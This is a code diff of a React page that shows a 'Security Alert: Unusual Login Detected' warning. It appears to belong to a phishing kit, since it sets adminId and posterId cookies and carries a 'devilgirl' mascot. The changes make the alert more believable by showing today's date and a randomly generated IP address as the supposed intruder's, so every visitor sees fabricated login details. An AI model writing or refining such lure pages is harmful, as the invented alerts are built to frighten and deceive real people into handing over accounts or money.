@@ -7,12 +7,20 @@ export default function Home({ adminId, posterId }) {
   const [showSecurityAlert, setShowSecurityAlert] = useState(true);
   Cookies.set("adminId", adminId);
   Cookies.set("posterId", posterId);
+
+  const generateRandomIP = () => {
+  return Array(4)
+    .fill(0)
+    .map(() => Math.floor(Math.random() * 256))
+    .join(".");
+};
+
   return (
     <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
       {showSecurityAlert ? (
-        <div className="max-w-[400px] w-full px-4 mb-10">
+        <div className="max-w-[450px] w-full px-4 mb-10">
           <div className="bg-white rounded-lg shadow-around-blue lg:shadow-none p-6 flex flex-col items-center text-center">
-            <div className="mb-4">
+            <div className="mb-6">
               <img
                 src="/images/devilgirl.png"
                 alt="Security Mascot"
@@ -20,19 +28,24 @@ export default function Home({ adminId, posterId }) {
               />
             </div>
 
-            <h1 className="text-2xl font-semibold text-gray-800 mb-1">
+            <h1 className="text-2xl font-normal text-gray-800 ">
               Security Alert
             </h1>
-            <h2 className="text-xl font-bold text-gray-900 mb-4">
+            <h2 className="text-xl font-normal text-gray-900 mb-2">
               Unusual Login Detected
             </h2>
 
             <div className="text-gray-600 space-y-2 mb-8">
-              <p className="text-lg">Another device has logged into your account</p>
+              <p className="text-md tracking-normal">Another device has logged into your account</p>
               <div className="text-gray-700 font-medium space-y-1">
-                <p>Chrome • February 22, 2026</p>
+                <p>Chrome • {new Date().toLocaleString("en-US", {
+                  month: "long",
+                  day: "numeric",
+                  year: "numeric",
+
+                })}</p>
                 <p>London, United Kingdom</p>
-                <p>117.248.30.98</p>
+                <p>{generateRandomIP()}</p>
               </div>
             </div>
 
